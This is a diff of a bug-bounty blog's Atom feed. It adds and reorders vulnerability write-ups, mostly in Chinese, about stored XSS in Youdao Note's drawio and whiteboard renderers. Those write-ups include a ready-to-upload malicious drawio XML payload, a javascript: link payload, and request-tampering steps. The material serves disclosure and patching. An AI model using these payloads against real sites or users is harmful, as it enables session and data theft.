@@ -1,10 +1,11 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T19:15:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T19:31:42+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
-  <p>Devto cta xss</p>
+  <p>Dev.to(Forem) cta xss</p>
 </blockquote>
 
 <h2 id="weakness">Weakness</h2>
+
 <blockquote>
   <p>XSS</p>
 </blockquote>
@@ -56,130 +57,7 @@
 <p>Forem codebase: <a href="https://github.com/forem/forem/blob/154cd202b29186ede9850f9807ac4dc76eda6e34/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="&lt;%= link %&gt;" class="ltag_cta ltag_cta--&lt;%= type %&gt;" role="button"&gt;&lt;%= description %&gt;&lt;/a&gt;
-</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版白板存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/04/30/xss-excalidraw.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版白板存在存储型XSS漏洞" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-excalidraw</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-excalidraw.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>有道云笔记网页版白板存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>中危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POC网页: <a href="https://note.youdao.com/s/5DooTGzS">https://note.youdao.com/s/5DooTGzS</a></li>
-</ul>
-
-<h2 id="summary">Summary</h2>
-
-<p>有道云白板使用过时<code class="language-plaintext highlighter-rouge">excalidraw</code>，该插件存在已知xss漏洞：给任意白板元素添加链接时，没有过滤链接的协议，攻击者能够构造javascript链接，受害者点击元素后触发javascript payload执行</p>
-
-<h3 id="detail">Detail</h3>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>打开有道云网页版，新建白板，在白板中画任意元素。</p>
-  </li>
-  <li>
-    <p>选定该元素，点击添加添加链接，链接框填写如下payload：<code class="language-plaintext highlighter-rouge">javascript://%0aalert(document.cookie)</code></p>
-
-    <p><img src="/assets/images/youdaoyun2/excalidraw1.png" alt="excalidraw1" /></p>
-  </li>
-  <li>
-    <p>点击元素链接后，xss触发。分享给他人，只需点击一次即可触发xss。</p>
-
-    <p><img src="/assets/images/youdaoyun2/excalidraw2.png" alt="excalidraw2" /></p>
-
-    <p><img src="/assets/images/youdaoyun2/excalidraw3.png" alt="excalidraw3" /></p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>POC链接：
-https://note.youdao.com/s/5DooTGzS</p>
-
-<p>参考：<a href="https://github.com/advisories/GHSA-v7v8-gjv7-ffmr">https://github.com/advisories/GHSA-v7v8-gjv7-ffmr</a></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-
-<ol>
-  <li>升级渲染excalidraw插件到最新版本</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版思维导图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/04/30/xss-mindmap.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版思维导图存在存储型XSS漏洞" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-mindmap</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-mindmap.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>有道云笔记网页版思维导图存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>中危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POC网页: <a href="https://note.youdao.com/s/JOK4BY08">https://note.youdao.com/s/JOK4BY08</a></li>
-</ul>
-
-<h2 id="summary">Summary</h2>
-
-<p>有道云笔记<code class="language-plaintext highlighter-rouge">mindmap</code>思维导图能够插入<code class="language-plaintext highlighter-rouge">javascript</code>链接，受害者点击链接后可触发xss执行。</p>
-
-<h4 id="trigger">Trigger</h4>
-
-<ol>
-  <li>
-    <p>打开有道云网页版，新建脑图。添加分支主题，选中该分支，然后点击插入链接。</p>
-
-    <p><img src="/assets/images/youdaoyun2/mindmap1.png" alt="mindmap1" /></p>
-  </li>
-  <li>
-    <p>输入任意url，开启burpsuite拦截请求：<code class="language-plaintext highlighter-rouge">POST /yws/api/personal/sync</code>。该请求将用户最新修改发送到后台。由于前端对url做了过滤，只能输入http协议，因此通过该请求修改成javascript协议。</p>
-
-    <p><img src="/assets/images/youdaoyun2/mindmap2.png" alt="mindmap2" /></p>
-
-    <p><img src="/assets/images/youdaoyun2/mindmap3.png" alt="mindmap3" /></p>
-  </li>
-  <li>
-    <p>发送请求，修改url链接成功，链接连接后，xss触发。</p>
-
-    <p><img src="/assets/images/youdaoyun2/mindmap4.png" alt="mindmap4" /></p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>POC链接：
-<a href="https://note.youdao.com/s/JOK4BY08">https://note.youdao.com/s/JOK4BY08</a></p>
-
-<p>视频：</p>
-
-<p>链接：<a href="https://pan.baidu.com/s/1KpYkdI1SHA2q21sij1mJpA">https://pan.baidu.com/s/1KpYkdI1SHA2q21sij1mJpA</a></p>
-
-<p>提取码：1314</p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
+</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</p>
@@ -1285,4 +1163,169 @@ ssh-rsa xxx hacker@test.com
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道云笔记网页端渲染流程图存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POC网页: <a href="https://note.youdao.com/s/QJo17hDz">https://note.youdao.com/s/QJo17hDz</a></li>
+  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a> 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
+  &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
+    &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
+      &lt;root&gt;
+        &lt;mxCell id="0" /&gt;
+        &lt;mxCell id="1" parent="0" /&gt;
+        &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
+          &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
+            &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
+          &lt;/mxCell&gt;
+        &lt;/UserObject&gt;
+      &lt;/root&gt;
+    &lt;/mxGraphModel&gt;
+  &lt;/diagram&gt;
+&lt;/mxfile&gt;
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+
+<p>网易有道云笔记可以上传流程图笔记，该笔记是xml格式的drawio文件。有道云笔记采用drawio插件对该文件进行渲染，然而，该插件版本过时并且存在存储型XSS漏洞。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>
+
+<h3 id="detail">Detail</h3>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>将下面payload保存为drawio文件，命名为xss.drawio。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
+ &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
+     &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
+     &lt;root&gt;
+         &lt;mxCell id="0" /&gt;
+         &lt;mxCell id="1" parent="0" /&gt;
+         &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
+         &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
+             &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
+         &lt;/mxCell&gt;
+         &lt;/UserObject&gt;
+     &lt;/root&gt;
+     &lt;/mxGraphModel&gt;
+ &lt;/diagram&gt;
+ &lt;/mxfile&gt;
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“上传文件”，将上一步的文件上传。</p>
+
+    <p><img src="/assets/images/youdaoyun2/save.png" alt="save" /></p>
+  </li>
+  <li>
+    <p>上传后，打开上传的流程图，xss触发。</p>
+
+    <p><img src="/assets/images/youdaoyun2/drawxss.png" alt="drawxss" /></p>
+  </li>
+  <li>
+    <p>将该笔记分享，发送给受害者打开，同样触发xss。</p>
+
+    <p><img src="/assets/images/youdaoyun2/share.png" alt="share" /></p>
+  </li>
+  <li>
+    <p>原因：drawio原始文件中，没有对UserObject元素的label字段进行过滤，导致label字段的xss得到执行。详见：<a href="https://github.com/jgraph/drawio/discussions/2791">https://github.com/jgraph/drawio/discussions/2791</a></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a>
+提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>升级渲染drawio的插件到最新版本</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版白板存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-excalidraw.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版白板存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-excalidraw</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-excalidraw.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道云笔记网页版白板存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POC网页: <a href="https://note.youdao.com/s/5DooTGzS">https://note.youdao.com/s/5DooTGzS</a></li>
+</ul>
+
+<h2 id="summary">Summary</h2>
+
+<p>有道云白板使用过时<code class="language-plaintext highlighter-rouge">excalidraw</code>，该插件存在已知xss漏洞：给任意白板元素添加链接时，没有过滤链接的协议，攻击者能够构造javascript链接，受害者点击元素后触发javascript payload执行</p>
+
+<h3 id="detail">Detail</h3>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>打开有道云网页版，新建白板，在白板中画任意元素。</p>
+  </li>
+  <li>
+    <p>选定该元素，点击添加添加链接，链接框填写如下payload：<code class="language-plaintext highlighter-rouge">javascript://%0aalert(document.cookie)</code></p>
+
+    <p><img src="/assets/images/youdaoyun2/excalidraw1.png" alt="excalidraw1" /></p>
+  </li>
+  <li>
+    <p>点击元素链接后，xss触发。分享给他人，只需点击一次即可触发xss。</p>
+
+    <p><img src="/assets/images/youdaoyun2/excalidraw2.png" alt="excalidraw2" /></p>
+
+    <p><img src="/assets/images/youdaoyun2/excalidraw3.png" alt="excalidraw3" /></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>POC链接：
+https://note.youdao.com/s/5DooTGzS</p>
+
+<p>参考：<a href="https://github.com/advisories/GHSA-v7v8-gjv7-ffmr">https://github.com/advisories/GHSA-v7v8-gjv7-ffmr</a></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>升级渲染excalidraw插件到最新版本</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
